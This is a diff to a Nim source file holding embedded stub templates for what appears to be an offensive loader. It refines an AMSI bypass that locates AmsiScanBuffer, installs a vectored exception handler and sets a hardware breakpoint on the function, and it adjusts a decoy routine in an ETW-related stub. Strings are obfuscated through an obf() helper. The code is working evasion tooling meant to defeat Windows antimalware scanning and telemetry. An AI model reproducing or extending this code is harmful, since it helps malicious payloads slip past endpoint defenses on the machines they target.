@@ -898,12 +898,22 @@ let AmsiStub * = """
                     echo obf("[-] Failed to Load AmsiScanBuffer")
                 return 0
                 #quit(1)
-
+            else:
+                when defined(verbose):
+                    echo obf("[+] AmsiScanBuffer found")
         # add our vectored exception handle
         when defined(DInvoke):
             let hExHandler = MyRtlAddVectoredExceptionHandler(1, AMSIExceptionHandler)
         else:
             let hExHandler = RtlAddVectoredExceptionHandler(1, AMSIExceptionHandler)
+        
+        if (hExHandler != nil):
+            when defined(verbose):
+                echo obf("[+] Vectored Exception Handler installed")
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to install Vectored Exception Handler")
+            return 0
 
         # Set a hardware breakpoint on AmsiScanBuffer function
         when defined(DInvoke):
@@ -1320,7 +1330,8 @@ let ETWStub * = """
       var randomNumber = rand.Next()
       when defined(verbose):
         echo randomNumber
-    Decoy()
+    when not defined(powershell):
+        Decoy()
     when defined(DInvoke):
         discard MySleep(1500)
     else:
